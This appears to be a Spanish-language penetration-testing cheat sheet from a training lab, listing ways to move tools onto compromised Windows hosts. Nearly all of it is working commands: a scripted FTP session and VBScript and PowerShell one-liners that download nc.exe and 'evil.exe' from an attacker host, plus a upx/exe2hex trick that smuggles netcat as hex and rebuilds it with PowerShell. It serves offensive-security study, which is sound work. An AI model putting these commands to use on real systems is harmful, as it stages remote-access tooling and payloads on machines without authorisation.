### Pure-FTPd
```
sudo apt update && sudo apt install pure-ftpd
sudo systemctl restart pure-ftpd
```

### Transferencia de archivos con hosts de Windows
```
echo open 10.11.0.4 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```

### Visual Basic get
```
C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

### PowerShell
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```

### Descargas de Windows con exe2hex y PowerShell
```
REDUCIR PESO
upx -9 nc.exe

CONVERTIR EN HEX
exe2hex -x nc.exe -p nc.cmd

RECONSTRUIR NC.EXE
powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
```

